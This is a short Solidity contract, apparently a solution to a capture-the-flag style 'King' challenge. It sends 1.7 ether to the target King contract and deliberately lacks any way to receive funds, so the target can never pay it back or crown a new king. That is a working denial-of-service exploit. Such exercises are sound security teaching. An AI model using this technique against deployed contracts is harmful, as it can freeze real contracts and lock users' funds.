// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // this contract has no receive or way to pay out, 
        // so the King contract can't pay it out or assign a new king.
       address(contractAddress).call{value: 1.7 ether}("");    

    }
}
